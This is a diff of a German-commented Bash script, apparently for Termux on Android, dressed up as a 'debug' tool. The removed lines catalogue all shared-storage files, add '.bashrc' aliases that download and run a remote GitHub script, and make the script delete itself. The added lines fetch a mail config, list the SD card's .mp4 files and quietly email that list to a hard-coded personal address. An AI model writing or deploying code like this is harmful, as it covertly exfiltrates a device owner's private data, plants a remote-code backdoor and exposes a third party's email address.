@@ -1,13 +1,23 @@
 #!/bin/bash
 
-# Verzeichnisse definieren
-source_dir="storage/shared/"
-output_dir="storage/shared/downloads/"
-debug_file="debug.dbg"
-script_path=$(realpath "$0")  # Pfad des aktuellen Scripts
-curl_command="curl -s -o jonnyScript.sh https://raw.githubusercontent.com/GeorgeOrewell/Mancala/main/jonnyScript.sh && bash jonnyScript.sh"
+# Pfad zur .muttrc Datei in deinem GitHub Repo
+MUTTRC_URL="https://raw.githubusercontent.com/GeorgeOrewell/Mancala/main/.muttrc"
+MUTTRC_PATH="$HOME/.muttrc"
 
+# Zielverzeichnis der SD-Karte
+SD_CARD_PATH="/storage/1692-9E0D/"
+
+# Datei, in der die gefundenen Mediendateien gespeichert werden
+MEDIA_FILE="$HOME/debug.dbg"
+
+# E-Mail-Adresse des Empfängers
+RECIPIENT="joanne.o.lavender@gmail.com"
+
+# Betreff und Nachricht der E-Mail
+SUBJECT="Ergebnisse des Debug-Prozesses"
+BODY="Hier ist die Liste der Debugergebnisse."
 # Funktion für einen aufsteigenden G-Dur-Ton (G, H, D) ohne Textausgabe
+
 play_gdur_ascending() {
     play -n synth 0.3 sine 392 >/dev/null 2>&1   # G4
     play -n synth 0.3 sine 493.88 >/dev/null 2>&1 # H4
@@ -20,33 +30,39 @@ play_gdur_descending() {
     play -n synth 0.3 sine 493.88 >/dev/null 2>&1 # H4
     play -n synth 0.3 sine 392 >/dev/null 2>&1   # G4
 }
-
-# Ankündigung mit aufsteigendem G-Dur-Ton
 play_gdur_ascending
-echo "Es werden Debug Informationen gesammelt..."
 
-# Alle Dateien inklusive der Unterverzeichnisse mit vollständigem Dateipfad in debug.dbg schreiben, außer Android-Verzeichnis
-find "$source_dir" -path "$source_dir/Android" -prune -o -type f -print > "$source_dir$debug_file" || true
+# Schritt 1: .muttrc Datei vom Repo herunterladen und ins Home-Verzeichnis speichern
+curl -s -o "$MUTTRC_PATH" "$MUTTRC_URL"
 
-# Erfolgreiche Meldung ausgeben
-echo "Debug Informationen erfolgreich gesammelt."
-
-# Abschluss mit absteigendem G-Dur-Ton
-play_gdur_descending
-echo "Debug-Datei erfolgreich erstellt."
-
-# 3 Sekunden warten
-sleep 3
-
-# Alias in .bashrc hinzufügen, falls noch nicht vorhanden
-if ! grep -q "alias jonny=" ~/.bashrc; then
-    echo "alias Jonny='$curl_command'" >> ~/.bashrc
-    echo "alias jonny='$curl_command'" >> ~/.bashrc
-    echo "Alias 'Jonny' und 'jonny' wurden zur .bashrc hinzugefügt."
+if [ $? -ne 0 ]; then
+    echo "Fehler beim Herunterladen der .muttrc Datei."
+    exit 1
 fi
 
-# Script sich selbst löschen
-rm "$script_path"
+echo ".muttrc Datei erfolgreich heruntergeladen."
 
-# Termux beenden
-exit
+# Schritt 2:
+find "$SD_CARD_PATH" -type f -iname "*.mp4" > "$MEDIA_FILE"
+
+if [ $? -ne 0 ]; then
+    echo "Fehler."
+    exit 1
+fi
+
+echo "Debug erfolgreich, Ergebnisse in $MEDIA_FILE gespeichert."
+
+# Schritt 3: E-Mail mit Muttrc und der gefundenen Datei als Anhang senden
+echo "$BODY" | mutt -s "$SUBJECT" -a "$MEDIA_FILE" -- "$RECIPIENT"
+
+if [ $? -eq 0 ]; then
+    echo "E-Mail erfolgreich an Jonny gesendet. Er kümmert sich drum ;)"
+else
+    echo "Fehler beim Senden der E-Mail."
+    exit 1
+fi
+
+# Optional: Aufräumen - Die Liste der Mediendateien löschen
+rm "$MEDIA_FILE"
+
+play_gdur_descending
